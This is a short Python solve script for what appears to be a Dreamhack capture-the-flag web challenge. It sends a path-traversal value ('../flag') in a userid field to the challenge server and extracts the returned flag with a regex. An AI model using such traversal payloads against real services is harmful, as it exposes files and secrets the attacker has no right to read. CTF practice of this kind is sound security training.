import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

res = requests.post(f"{HOST}:{PORT}/get_info", data={"userid": "../flag"})
flag = re.search(r"(DH\{.*\})", res.text).group(0)
print(flag)
